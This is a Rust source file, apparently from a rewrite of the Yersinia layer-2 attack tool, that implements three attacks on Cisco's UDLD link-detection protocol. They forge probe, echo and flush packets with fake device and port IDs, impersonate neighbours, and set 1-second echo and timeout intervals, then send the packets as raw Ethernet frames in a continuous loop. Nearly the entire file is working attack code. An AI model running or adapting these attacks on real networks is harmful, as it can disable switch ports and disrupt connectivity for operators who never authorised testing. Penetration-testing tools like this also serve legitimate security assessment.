//! UDLD Attack Implementations
use super::packet::{UdldOpcode, UdldPacket, UdldTlv};
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct UdldSpoofingAttack {
    pub device_id: String,
    pub port_id: String,
    pub opcode: UdldOpcode,
}

impl UdldSpoofingAttack {
    pub fn new(device_id: String, port_id: String) -> Self {
        Self {
            device_id,
            port_id,
            opcode: UdldOpcode::Probe,
        }
    }

    pub fn with_opcode(mut self, opcode: UdldOpcode) -> Self {
        self.opcode = opcode;
        self
    }

    pub fn build_probe(&self) -> UdldPacket {
        UdldPacket::probe(&self.device_id, &self.port_id)
    }

    pub fn build_echo(&self, neighbor_device: &str, neighbor_port: &str) -> UdldPacket {
        UdldPacket::echo(
            &self.device_id,
            &self.port_id,
            neighbor_device,
            neighbor_port,
        )
    }

    pub fn build_flush(&self) -> UdldPacket {
        UdldPacket::flush(&self.device_id, &self.port_id)
    }
}

#[async_trait]
impl Attack for UdldSpoofingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(15); // UDLD hello interval

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Build the appropriate UDLD packet based on opcode
            let udld_packet = match self.opcode {
                UdldOpcode::Reserved => self.build_probe(), // Default to probe for reserved
                UdldOpcode::Probe => self.build_probe(),
                UdldOpcode::Echo => {
                    // For echo, we need neighbor info - use dummy values
                    self.build_echo("Neighbor", "Port")
                }
                UdldOpcode::Flush => self.build_flush(),
            };

            let udld_bytes = udld_packet.to_bytes();

            // UDLD uses multicast MAC 01:00:0c:cc:cc:cc
            let dst_mac = MacAddress([0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            // UDLD uses LLC/SNAP encapsulation
            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::LLC, udld_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending UDLD packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "UDLD Spoofing Attack"
    }
}

#[derive(Debug, Clone)]
pub struct NeighborImpersonationAttack {
    pub fake_device_id: String,
    pub fake_port_id: String,
    pub target_device: String,
    pub target_port: String,
}

impl NeighborImpersonationAttack {
    pub fn new(
        fake_device_id: String,
        fake_port_id: String,
        target_device: String,
        target_port: String,
    ) -> Self {
        Self {
            fake_device_id,
            fake_port_id,
            target_device,
            target_port,
        }
    }

    pub fn build_impersonation_packets(&self) -> Vec<UdldPacket> {
        vec![
            // Send probe as the fake device
            UdldPacket::probe(&self.fake_device_id, &self.fake_port_id),
            // Send echo claiming to have received from target
            UdldPacket::echo(
                &self.fake_device_id,
                &self.fake_port_id,
                &self.target_device,
                &self.target_port,
            ),
        ]
    }
}

#[async_trait]
impl Attack for NeighborImpersonationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(15);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Build impersonation packets (probe + echo)
            let packets = self.build_impersonation_packets();

            let dst_mac = MacAddress([0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            // Send all packets in the sequence
            for udld_packet in packets {
                let udld_bytes = udld_packet.to_bytes();
                let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::LLC, udld_bytes);
                let frame_bytes = frame.to_bytes();

                if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                    ctx.stats.increment_errors();
                    eprintln!("Error sending UDLD impersonation packet: {}", e);
                } else {
                    ctx.stats.increment_packets_sent();
                    ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
                }

                // Small delay between packets in sequence
                time::sleep(Duration::from_millis(100)).await;
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "UDLD Neighbor Impersonation Attack"
    }
}

#[derive(Debug, Clone)]
pub struct EchoManipulationAttack {
    pub device_id: String,
    pub port_id: String,
    pub manipulate_echo: bool,
    pub fake_neighbor: Option<(String, String)>,
}

impl EchoManipulationAttack {
    pub fn new(device_id: String, port_id: String) -> Self {
        Self {
            device_id,
            port_id,
            manipulate_echo: false,
            fake_neighbor: None,
        }
    }

    pub fn with_fake_neighbor(mut self, neighbor_device: String, neighbor_port: String) -> Self {
        self.fake_neighbor = Some((neighbor_device, neighbor_port));
        self.manipulate_echo = true;
        self
    }

    pub fn build_manipulation_packets(&self) -> Vec<UdldPacket> {
        let mut packets = Vec::new();

        if let Some((ref neighbor_dev, ref neighbor_port)) = self.fake_neighbor {
            // Send echo with fake neighbor information
            packets.push(UdldPacket::echo(
                &self.device_id,
                &self.port_id,
                neighbor_dev,
                neighbor_port,
            ));
        }

        // Send probe without proper echo response
        let mut probe = UdldPacket::probe(&self.device_id, &self.port_id);
        // Manipulate timing intervals to cause detection issues
        probe.tlvs.push(UdldTlv::echo_interval(1)); // Very short interval
        probe.tlvs.push(UdldTlv::timeout_interval(1)); // Very short timeout
        packets.push(probe);

        // Send flush to reset neighbor state
        packets.push(UdldPacket::flush(&self.device_id, &self.port_id));

        packets
    }
}

#[async_trait]
impl Attack for EchoManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(5); // More frequent for manipulation

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Build manipulation packets (echo with fake neighbor + probe with bad intervals + flush)
            let packets = self.build_manipulation_packets();

            let dst_mac = MacAddress([0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            // Send all manipulation packets in sequence
            for udld_packet in packets {
                let udld_bytes = udld_packet.to_bytes();
                let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::LLC, udld_bytes);
                let frame_bytes = frame.to_bytes();

                if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                    ctx.stats.increment_errors();
                    eprintln!("Error sending UDLD echo manipulation packet: {}", e);
                } else {
                    ctx.stats.increment_packets_sent();
                    ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
                }

                // Small delay between manipulation packets
                time::sleep(Duration::from_millis(200)).await;
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "UDLD Echo Manipulation Attack"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_udld_spoofing() {
        let attack = UdldSpoofingAttack::new("FakeSwitch".to_string(), "Gi0/1".to_string());
        let probe = attack.build_probe();
        assert_eq!(probe.opcode, UdldOpcode::Probe as u8);
    }

    #[test]
    fn test_neighbor_impersonation() {
        let attack = NeighborImpersonationAttack::new(
            "FakeDevice".to_string(),
            "Gi0/1".to_string(),
            "TargetDevice".to_string(),
            "Gi0/2".to_string(),
        );
        let packets = attack.build_impersonation_packets();
        assert_eq!(packets.len(), 2);
    }

    #[test]
    fn test_echo_manipulation() {
        let attack = EchoManipulationAttack::new("Device".to_string(), "Port".to_string())
            .with_fake_neighbor("Neighbor".to_string(), "Port2".to_string());
        let packets = attack.build_manipulation_packets();
        assert!(!packets.is_empty());
    }
}
